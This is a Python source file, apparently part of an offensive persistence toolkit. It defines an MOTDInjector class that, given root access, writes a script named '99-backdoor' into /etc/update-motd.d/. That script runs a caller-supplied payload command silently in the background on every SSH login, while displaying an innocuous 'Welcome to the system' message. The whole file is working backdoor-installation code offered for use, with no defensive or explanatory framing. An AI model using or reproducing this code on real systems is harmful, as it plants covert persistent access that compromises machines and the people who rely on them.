import os
from ..core import ShellProfilePersistence

class MOTDInjector(ShellProfilePersistence):
    def inject(self, payload_command: str):
        if not self.is_root:
            print("[!] Root required for MOTD injection")
            return None

        script_path = "/etc/update-motd.d/99-backdoor"
        content = f"""#!/bin/sh
{payload_command} &>/dev/null &
echo "Welcome to the system"
"""

        try:
            with open(script_path, 'w') as f:
                f.write(content)
            os.chmod(script_path, 0o755)

            print(f"[+] MOTD backdoor injected")
            print(f"[+] File: {script_path}")
            print(f"[+] Triggers: Every SSH login")

            return {
                'method': 'motd_injection',
                'file': script_path,
                'remove_cmd': f"rm -f {script_path}"
            }
        except Exception as e:
            print(f"[-] Error: {e}")
            return None